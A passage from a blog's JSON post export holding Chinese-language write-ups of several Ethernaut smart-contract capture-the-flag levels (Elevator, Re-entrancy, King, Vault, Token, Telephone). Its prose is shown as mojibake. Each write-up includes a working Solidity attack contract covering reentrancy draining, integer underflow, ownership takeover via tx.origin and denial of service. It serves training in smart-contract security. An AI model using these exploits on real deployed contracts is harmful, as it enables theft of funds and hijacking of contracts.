å¼€å§‹ç½‘ä¸Šå¯»æ‰¾è§£å†³æ–¹æ³•ï¼Œè§£å†³æ–¹æ³•ï¼šä¿®æ”¹ç¼–è¾‘ç‡ƒæ–™è´¹é€‰é¡¹ä¸º â€œé«˜çº§â€ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x6eE471bd0AE8A991C76972ADB0365D7cfC4e3fE9 3.2 é€šè¿‡å®ä¾‹åœ°å€è°ƒç”¨åˆçº¦ 3.3 è°ƒç”¨Dlegateåˆçº¦ä¸­çš„ pwn()å‡½æ•°ï¼Œå°†ç‡ƒæ–™é™åˆ¶ä»29328ä¿®æ”¹ä¸º39328 3.3 å‘ç°åšé”™äº† wwwwâ€¦.. å¼„äº†å¥½ä¹…ï¼ŒåŸæ¥æ˜¯éœ€è¦ä¿®æ”¹ç¼–è¾‘ç‡ƒæ–™è´¹é€‰é¡¹, å°†å…¶è®¾ç½®ä¸ºâ€œé«˜çº§â€ 3.4 å†æ¬¡è°ƒç”¨pwn() å‡½æ•°ï¼Œåœ°å€ä¿®æ”¹æˆåŠŸ 3.5 åˆ°EtherScan æŸ¥çœ‹äº¤æ˜“è®°å½•ï¼Œå‘ç°æˆåŠŸè°ƒç”¨pwnå‡½æ•° 3.6 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.7 æˆåŠŸï¼ï¼ï¼ï¼ tipsï¼š1.å‚è€ƒåšå®¢ 2. å‚è€ƒè§†é¢‘","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Elevator","slug":"CTFS/ethernaut/Elevator ","date":"2023-01-08T13:16:15.000Z","updated":"2023-01-08T13:16:15.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Elevator /","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Elevator%20/","excerpt":"","text":"Elevator1. é¢˜ç›®è¦æ±‚ 1.1 ç”µæ¢¯ä¸ä¼šè®©ä½ è¾¾åˆ°å¤§æ¥¼é¡¶éƒ¨, å¯¹å§? è¿™å¯èƒ½æœ‰å¸®åŠ©: æœ‰çš„æ—¶å€™ solidity ä¸æ˜¯å¾ˆæ“…é•¿ä¿å­˜ promises. è¿™ä¸ª ç”µæ¢¯ æœŸå¾…è¢«ç”¨åœ¨ä¸€ä¸ª å»ºç­‘ é‡Œ. 1.2 é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123; function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; 2. åˆ†ætipsï¼š å‚è€ƒåšå®¢ 2.1 isLastFloor()çš„è¿”å›å€¼å¿…é¡»ä¸º False æ‰èƒ½flooræ›´æ”¹å¹¶å˜ä¸ºtoptrueã€‚æˆ‘æƒ³åˆ°äº†ä¸¤ç§æ–¹æ³•ï¼š æˆ‘ä»¬è®©æˆ‘ä»¬çš„é¡¶å±‚ä¸æ˜¯ 0ï¼ˆ çš„èµ·å§‹å€¼floorï¼‰å¹¶ä¸”æˆ‘ä»¬æ£€æŸ¥æ˜¯å¦flooræ˜¯é¡¶å±‚çš„æ•°å€¼ã€‚ç„¶åæˆ‘ä»¬å®šä¹‰å‡½æ•°è¿”å›å½“å‰å€¼å’Œé¡¶å±‚å€¼isLastFloor()ä¹‹é—´çš„æ¯”è¾ƒã€‚floor æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå°†ç”µæ¢¯å‘é€åˆ°å…¶å½“å‰æ¥¼å±‚ (0) çš„å‡½æ•°ï¼Œä½†æˆ‘ä»¬è¿è¡Œæ­¤å‡½æ•°ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬ç¡®ä¿è¿”å›isLastFloor()falseï¼Œç„¶åä»…è¿”å› trueã€‚è¿™å®é™…ä¸Šæ„å‘³ç€æˆ‘ä»¬çš„é¡¶å±‚æ˜¯ 0 å±‚ã€‚ä½†æ˜¯åœ¨ç¬¬äºŒæ¬¡è¿è¡ŒæœŸé—´ï¼Œtopå˜æˆäº†çœŸçš„ã€‚ 2.2 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ 123456789101112131415161718contract Hack &#123; Elevator private immutable target; uint private count; constructor(address _target) &#123; target = Elevator(_target); &#125; function pwn() external &#123; target.goTo(1); require(target.top(), &quot;not top&quot;); &#125; function isLastFloor(uint) external returns (bool) &#123; count++; return count &gt; 1; &#125;&#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š 0x156b4F96D63961020a9fe45947d4eAB6F4053aA8 3.2 é€šè¿‡å®ä¾‹åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ï¼š 3.3 è°ƒç”¨pwn() å‡½æ•° 3.4 æäº¤å®ä¾‹æŸ¥çœ‹ç»“æœ 3.5 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Re-entrancy","slug":"CTFS/ethernaut/Re-entrancy","date":"2023-01-08T10:13:13.000Z","updated":"2023-01-08T10:13:13.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Re-entrancy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Re-entrancy/","excerpt":"","text":"Re-entrancy1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§. è¿™äº›å¯èƒ½æœ‰å¸®åŠ©: ä¸å¯ä¿¡çš„åˆçº¦å¯ä»¥åœ¨ä½ æ„æ–™ä¹‹å¤–çš„åœ°æ–¹æ‰§è¡Œä»£ç . Fallback methods æŠ›å‡º&#x2F;æ¢å¤ bubbling æœ‰çš„æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦çš„æœ€å¥½æ–¹å¼æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦. æŸ¥çœ‹ä¸Šæ–¹å¸®åŠ©é¡µé¢, â€œBeyond the consoleâ€ éƒ¨åˆ† 1.2 é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; receive() external payable &#123;&#125;&#125; 2. åˆ†ætips: å‚è€ƒåšå®¢ 2.1 åˆ†æä»£ç  function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 - a.è¯¥åŠŸèƒ½æ£€æŸ¥æ˜¯å¦`msg.sender`æœ‰è¶³å¤Ÿçš„ä½™é¢æ¥æå–`_amount`ä»¥å¤ªå¸ - b.`_amount`å®ƒç»§ç»­é€šè¿‡ä¸€ä¸ªä½çº§å‡½æ•°å‘é€è¯·æ±‚ï¼Œ`call`è¯¥å‡½æ•°å°†ä½¿ç”¨æ‰€æœ‰å‰©ä½™çš„`gas`æ¥æ‰§è¡Œæ“ä½œ - c.å®ƒæ›´æ–°`msg.sender`å‡å°‘é‡‘é¢çš„ä½™é¢- `**æ¼æ´åˆ©ç”¨é€‰é¡¹ 1ï¼Œæ‡’æƒ°è€Œä¸èªæ˜çš„é€‰é¡¹ï¼šåœ¨å¾ªç¯ä¸­åˆ©ç”¨é‡å…¥** å¦‚æœèµ„é‡‘ä¸æ˜¯é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥`0.001 ether / 100`é€šè¿‡`donate`å‡½æ•°å‘é€å¹¶é‡æ–°è¿›å…¥`withdraw`å‡½æ•° 100 æ¬¡ + åˆå§‹è°ƒç”¨ã€‚ `0.001 ether / 100`åªæ˜¯ä¸€ä¸ªä»»æ„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®ä¿åœ¨é‡æ–°è¿›å…¥å‡½æ•°æ—¶ä¸ä¼šæ¶ˆè€—å¤ªå¤šæ°”ä½“ï¼Œ`withdraw`å¦åˆ™äº¤æ˜“ä¼šå› ä¸º**Out of Gas å¼‚å¸¸**è€Œæ¢å¤ã€‚ **æ¼æ´åˆ©ç”¨é€‰é¡¹ 2ï¼Œåˆ‡è‚‰åˆ€æ–¹å¼ï¼šåˆ©ç”¨é‡å…¥å’Œä¸‹æº¢** è¿™ä¸ªè§£å†³æ–¹æ¡ˆè¦ä¼˜é›…å¾—å¤šï¼Œå®ƒåˆ©ç”¨äº†ä¸¤ä¸ªä¸åŒçš„é—®é¢˜ï¼šé‡å…¥å’Œä¸‹æº¢ï¼ æˆ‘ä»¬å·²ç»çŸ¥é“é‡å…¥é—®é¢˜ï¼Œå¹¶ä¸”æˆ‘ä»¬è¯´`balances[msg.sender] -= _amount`â€œæ­£å¸¸â€æ“ä½œçš„ä¸‹æº¢å°†å—åˆ°ä¿æŠ¤ï¼Œå› ä¸º`balances[msg.sender] &gt;= _amount`å³ä½¿è¯¥æ“ä½œä¸ä½¿ç”¨`SafeMath`ï¼Œå¦‚æœæˆ‘ä»¬ç¡®å®š maxï¼Œä¹Ÿæ²¡æœ‰åŠæ³•ä¸‹æº¢å¯èƒ½`balances[msg.sender]`ä¼š**å½’é›¶**ã€‚ ä½†æ˜¯å› ä¸ºæˆ‘ä»¬å¯ä»¥é‡æ–°è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸¤æ¬¡ç›¸åŒçš„`balances[msg.sender] -= _amount`æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä½™é¢ç¬¬ä¸€æ¬¡ä¼šå˜ä¸ºé›¶ï¼Œä½†ç¬¬äºŒæ¬¡ä¼š`type(uint256).max`å› ä¸ºä¸‹æº¢è€Œå˜ä¸ºé›¶ï¼ æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨`withdraw`æå–å­˜å‚¨åœ¨å—å®³è€…åˆçº¦ä¸­çš„å…¨éƒ¨ä»¥å¤ªå¸ï¼ **æ³¨æ„ï¼š**ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆ**åªæœ‰**åœ¨ä¸‹æº¢çš„æƒ…å†µä¸‹æ‰æœ‰å¯èƒ½ã€‚å¦‚æœä¸å­˜åœ¨ä¸‹æº¢é—®é¢˜ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡é‡å…¥å¾ªç¯è§£å†³æ–¹æ¡ˆæ¥è§£å†³æŒ‘æˆ˜ã€‚`- 2.2 [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=K8AFyNiuTXs) å†™çš„æ”»å‡»åˆçº¦:- ```solidity interface IReentracy &#123; function donate(address) external payable; function withdraw(uint256) external; &#125; contract Hack&#123; IReentracy private immutable target; constructor(address _target) public &#123; target = IReentracy(_target); &#125; function attack() public payable&#123; target.donate.value(0.001 ether)(address(this)); target.withdraw(1e18); &#125; receive() external payable &#123; uint amount = min(1e18, address(target).balance); if (amount &gt; 0) &#123; target.withdraw(amount); &#125; require(address(target).balance == 0, &quot;target balance &gt; 0&quot;); selfdestruct(payable(msg.sender)); &#125; function min(uint x, uint y) private pure returns(uint) &#123; return x &lt;= y ? x : y; &#125; &#125; 2.3 è¿›è¡Œé‡å…¥æ”»å‡»å³å¯ 3. è§£é¢˜ 3.1 è·å–å…³å¡çš„å®ä¾‹ï¼š0xcf96fB43ffF6B6F8c05f353ce8271931271E69b0 3.2 åˆ©ç”¨å®ä¾‹åœ°å€éƒ¨ç½²Hackåˆçº¦ï¼Œè°ƒç”¨attrack() å‡½æ•° è®¾ç½®msg.value &#x3D; 1 ether 3.3 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.4 æˆåŠŸï¼ï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"King","slug":"CTFS/ethernaut/King","date":"2023-01-08T08:17:13.000Z","updated":"2023-01-08T08:17:13.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/King/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/King/","excerpt":"","text":"King1. é¢˜ç›®è¦æ±‚ 1.1 é¢˜ç›®ï¼šä¸‹é¢çš„åˆçº¦è¡¨ç¤ºäº†ä¸€ä¸ªå¾ˆç®€å•çš„æ¸¸æˆ: ä»»ä½•ä¸€ä¸ªå‘é€äº†é«˜äºç›®å‰ä»·æ ¼çš„äººå°†æˆä¸ºæ–°çš„å›½ç‹. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, ä¸Šä¸€ä¸ªå›½ç‹å°†ä¼šè·å¾—æ–°çš„å‡ºä»·, è¿™æ ·å¯ä»¥èµšå¾—ä¸€äº›ä»¥å¤ªå¸. çœ‹èµ·æ¥åƒæ˜¯åºæ°éª—å±€.è¿™ä¹ˆæœ‰è¶£çš„æ¸¸æˆ, ä½ çš„ç›®æ ‡æ˜¯æ”»ç ´ä»–, å½“ä½ æäº¤å®ä¾‹ç»™å…³å¡æ—¶, å…³å¡ä¼šé‡æ–°ç”³æ˜ç‹ä½. ä½ éœ€è¦é˜»æ­¢ä»–é‡è·ç‹ä½æ¥é€šè¿‡è¿™ä¸€å…³. 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123; address king; uint public prize; address public owner; constructor() payable &#123; owner = msg.sender; king = msg.sender; prize = msg.value; &#125; receive() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; &#125; function _king() public view returns (address) &#123; return king; &#125;&#125; 2. åˆ†ætipsï¼šå‚è€ƒåšå®¢ 2.1 é˜…è¯»ä»£ç å¯çŸ¥ï¼Œè¯¥receiveå‡½æ•°æ˜¯ä¸€ä¸ªç‰¹æ®Šå‡½æ•°ï¼Œå…è®¸åˆçº¦ç›´æ¥ä»å¤–éƒ¨åˆçº¦æˆ– EOA æ¥æ”¶ä»¥å¤ªå¸ 2.2 æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°çš„æ˜¯require(msg.value &gt;= prize || msg.sender == owner)ã€‚æ­¤æ£€æŸ¥å…è®¸owneråˆçº¦çš„ å§‹ç»ˆæ‹¥æœ‰åˆçº¦çš„ç‹æƒï¼Œé‡ç½®æ‰€æœ‰å€¼ã€‚ 2.3 æ‰€ä»¥ç°åœ¨æˆ‘ä»¬çŸ¥é“transferå…è®¸æ‚¨å°† Ether å‘é€åˆ°ä¸€ä¸ªåœ°å€ï¼Œæ¶ˆè€—2300gas å¹¶åœ¨æ— æ³•æ‰§è¡Œäº¤æ˜“æ—¶æ¢å¤ã€‚ å¦‚æœâ€œå°†ä»¥å¤ªå¸è½¬ç§»åˆ°â€äº¤æ˜“æ¢å¤ï¼Œä¸ºä»€ä¹ˆä¼šå‡ºç°é—®é¢˜ï¼Ÿå¥½å§ï¼Œå› ä¸ºå¦‚æœè¿˜åŸï¼Œæˆ‘ä»¬çš„åŠŸèƒ½transferä¹Ÿä¼šè¿˜åŸï¼å¹¶ä¸”é€šè¿‡è¿˜åŸå®ƒä¼šä½¿åˆçº¦æ— æ³•ä½¿ç”¨ï¼Œæ²¡æœ‰äººå¯ä»¥æˆä¸ºæ–°çš„å›½ç‹ï¼receive ä¸€ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆæ˜¯åªåˆ›å»ºä¸€ä¸ªContractä¸æ¥å—ä»»ä½•ç±»å‹çš„ Ether è½¬ç§»çš„å¯¹è±¡ã€‚ 2.4 æ”»å‡»åˆçº¦ 123456contract Exploiter &#123; constructor(address payable _to) payable &#123; (bool success, ) = address(_to).call&#123;value: msg.value&#125;(&quot;&quot;); require(success, &quot;call failed!!!&quot;); &#125; &#125; 2.5 è·å–å®ä¾‹åœ°å€ï¼Œå¹¶å¡«å…¥åˆ°Exploiteråˆçº¦æ„é€ å™¨ä¸­ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x25766108F8Fa65C8061FB17E7762D4BC42Fc882C 3.2 è°ƒç”¨å…³å¡å®ä¾‹éƒ¨ç½²çš„åˆçº¦ï¼Œå¾—åˆ°å®ä¾‹åˆçº¦ä¸­çš„prize 3.3 æ ¹æ®å…³å¡å®ä¾‹åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ 3.4 DeployåæŸ¥çœ‹kingçš„å€¼å‘ç”Ÿäº†æ”¹å˜ 3.5 æäº¤å®ä¾‹ 3.6 æˆåŠŸï¼ï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Vault","slug":"CTFS/ethernaut/Vault","date":"2023-01-08T07:10:10.000Z","updated":"2023-01-08T07:10:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Vault/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Vault/","excerpt":"","text":"1.é¢˜ç›®è¦æ±‚ 1.1 è¦æ±‚ ï¼šæ‰“å¼€ vault æ¥é€šè¿‡è¿™ä¸€å…³! é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123; bool public locked; bytes32 private password; constructor(bytes32 _password) &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 2. åˆ†æ 2.1 åœ¨åŒºå—é“¾ä¸Šä½¿ç”¨æˆ–å¼€å‘æ—¶ï¼Œé¦–å…ˆè¦è®°ä½çš„æ˜¯ï¼ŒåŒºå—é“¾ä¸­æ²¡æœ‰ä»»ä½•ä¸œè¥¿æ˜¯ç§æœ‰çš„ã€‚å³ä½¿æ‚¨å°†å˜é‡å£°æ˜ä¸ºprivateæˆ– ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æ‰€æœ‰å†…å®¹internal 2.2 çŠ¶æ€å˜é‡å­˜å‚¨åœ¨åˆçº¦å­˜å‚¨ä¸­ï¼Œå› ä¸ºå˜é‡passwordæ˜¯ä¸€ä¸ª 32 å­—èŠ‚çš„æ•°æ®ï¼Œå®ƒæ€»æ˜¯ä¼šå¡«æ»¡æ•´ä¸ªæ§½ï¼Œä½¿å¾—å®ƒåœ¨åˆçº¦çš„ç¬¬äºŒä¸ªæ§½ä¸­çš„ä½ç½®éå¸¸å¯é¢„æµ‹ï¼Œå› ä¸ºç¬¬äºŒä¸ªçŠ¶æ€å˜é‡å®šä¹‰ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨web3.pygetstorageat()ä¸Šçš„åŠŸèƒ½ï¼Œé€šè¿‡åœ¨ç¬¬äºŒä¸ªå­˜å‚¨æ§½ä¸­æŸ¥æ‰¾æ¥æŸ¥çœ‹å¯†ç æ˜¯ä»€ä¹ˆã€‚ç„¶åæˆ‘ä»¬å¯ä»¥é€‰æ‹©å°†å…¶è½¬æ¢ä¸ºæ–‡æœ¬ä»¥æŸ¥çœ‹å¯†ç æ˜¯ä»€ä¹ˆã€‚ 2.3 åœ¨æµè§ˆå™¨æ§åˆ¶å°ä¸Šæ‰§è¡Œ * await web3.eth.getStorageAt(contract.address,1) * å‘½ä»¤ è·å–password ç„¶ååœ¨ å…³å¡å®ä¾‹éƒ¨ç½²çš„åˆçº¦ä¸Šè¾“å…¥è·å–åˆ°çš„ password 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x3741430AB42C816Dbbe583001C9615049ad09e31 3.2 æ‰§è¡Œ *await web3.eth.getStorageAt(contract.address,1) * å¾—åˆ°password ï¼š0x412076657279207374726f6e67207365637265742070617373776f7264203a29 è°ƒç”¨å®ä¾‹éƒ¨ç½² çš„åˆçº¦,å¹¶è°ƒç”¨åˆçº¦çš„ unlock() å‡½æ•°ï¼š 3.3 å¯¹æ¯”è°ƒç”¨ unlock() å‡½æ•°ä¹‹ålocked çš„å€¼ 3.4 æäº¤æ¡ˆä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.5 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Token","slug":"CTFS/ethernaut/Token","date":"2023-01-08T06:30:10.000Z","updated":"2023-01-08T06:30:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Token/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Token/","excerpt":"","text":"Token1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯æ”»ç ´ä¸‹é¢è¿™ä¸ªåŸºç¡€ token åˆçº¦ 1.2 ä½ æœ€å¼€å§‹æœ‰20ä¸ª token, å¦‚æœä½ é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¢åŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡,ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸€å…³,å½“ç„¶è¶Šå¤šè¶Šå¥½ 1.3 åˆçº¦ä»£ç ï¼š 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; 2. åˆ†æ 2.1 ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼š^0.6.0ï¼Œä¸”æ²¡ç”¨SafeMathåº“ï¼Œæ‰€ä»¥å¯èƒ½å‡ºç°æ•´æ•°æº¢å‡ºæ¼æ´ 2.2 ä»£ç åˆ†æï¼š require(balances[msg.sender] - _value &gt;= 0);æ£€æŸ¥ç”¨æˆ·ä½™é¢æ˜¯å¦å¤§äºæˆ–ç­‰äºé›¶ï¼Œä½†ç”±äºä½™é¢æ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œå½“æˆ‘ä»¬å‡å»çš„æ•°å­— ( _value) å¤§äºä»£balances[msg.sender]å¸çš„é’±åŒ…ä½™é¢ ( ) æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæº¢å‡ºï¼Œé’±åŒ…ä½™é¢å˜ä¸ºæœ€å¤§æ— ç¬¦å·æ•´æ•°å‡å»è¿™ä¸¤ä¸ªå€¼ä¹‹é—´çš„å·®å€¼ã€‚ é€šè¿‡ require è¯­å¥åï¼Œè¿˜æœ‰ä¸€ä¸ªé”™è¯¯æ˜¯å°†è¿™ä¸ªæº¢å‡ºçš„å€¼èµ‹å€¼ç»™ çš„ä½™é¢msg.senderï¼š 2.3 æ”»å‡»åˆçº¦ï¼š 12345678910contract Hack &#123; function attarck() public &#123; // å®ä¾‹åœ°å€ Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB); // è‡ªå·±çš„é’±åŒ…åœ°å€ token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100); &#125;&#125; 2.4 è°ƒç”¨Hack åˆçº¦ä¸­çš„ attract() å‡½æ•° 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x03130C8ca692f8980461A9C96411aAf5e0A71AcB 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æŸ¥çœ‹æˆ‘çš„é’±åŒ…åœ°å€çš„ä½™é¢ 3.4 å¼€å§‹åˆçº¦æ”»å‡»ï¼Œå¹¶æŸ¥çœ‹ä½™é¢ 3.5 æäº¤å®ä¾‹ï¼Œè¿”å›ç»“æœï¼ŒæˆåŠŸï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Telephone","slug":"CTFS/ethernaut/Telephone","date":"2023-01-08T04:47:10.000Z","updated":"2023-01-08T04:47:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Telephone/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Telephone/","excerpt":"","text":"1. é¢˜ç›®è¦æ±‚ è¦æ±‚ï¼š è·å–åˆçº¦çš„æ‰€æœ‰æƒ åˆçº¦ä»£ç ï¼š 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 2. åˆ†æ 2.1 çŠ¶æ€ownerå˜é‡åœ¨constructorï¼Œå”¯ä¸€ä¼šæ›´æ–°ownerçš„å‡½æ•°æ˜¯ changeOwner(),å®ƒæ˜¯ä¸€ä¸ªåªæ¥å—ä¸€ä¸ªå‚æ•°çš„å…¬å…±å‡½æ•°address _ownerã€‚å¦‚æœtx.originå€¼ä¸åŒï¼Œmsg.senderå®ƒå°†ownerä½¿ç”¨å‡½æ•°è¾“å…¥å‚æ•°æ›´æ–°_ownerã€‚ 2.2 tx.origin() å’Œ msg.sender()çš„åŒºåˆ« tx.origin(address)ï¼š äº¤æ˜“çš„å‘é€æ–¹ï¼ˆå®Œæ•´çš„è°ƒç”¨é“¾ï¼‰è¿”å›çš„æ˜¯å·²å‘é€ï¼ˆåŸå§‹ï¼‰äº¤æ˜“çš„åœ°å€ msg.sender( address)ï¼šæ¶ˆæ¯çš„å‘é€è€…ï¼ˆå½“å‰é€šè¯ï¼‰è¿”å›çš„æ˜¯å‘èµ·å‘¼å«çš„å€¼externalï¼ˆåˆçº¦è°ƒç”¨è€…ï¼‰ ç”»å›¾åŒºåˆ†ï¼š 2.3 æ”»å‡»åˆçº¦ï¼š contract Hack &#123; function exploit(Telephone level) public &#123; level.changeOwner(msg.sender); &#125; &#125; 2.4 è°ƒç”¨Hack åˆçº¦ä¸­çš„ exploitï¼ˆï¼‰å‡½æ•°ï¼Œå½¢å‚æ˜¯å…³å¡çš„å®ä¾‹åœ°å€å°±ğŸ†—çš„ 3. è§£é¢˜ 3.1 è·å–å…³å¡çš„å®ä¾‹ï¼š0xf956A62d9BD792a712763aA21863d3025A5dd926 3.2 è°ƒç”¨å…³å¡åˆçº¦å¹¶éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 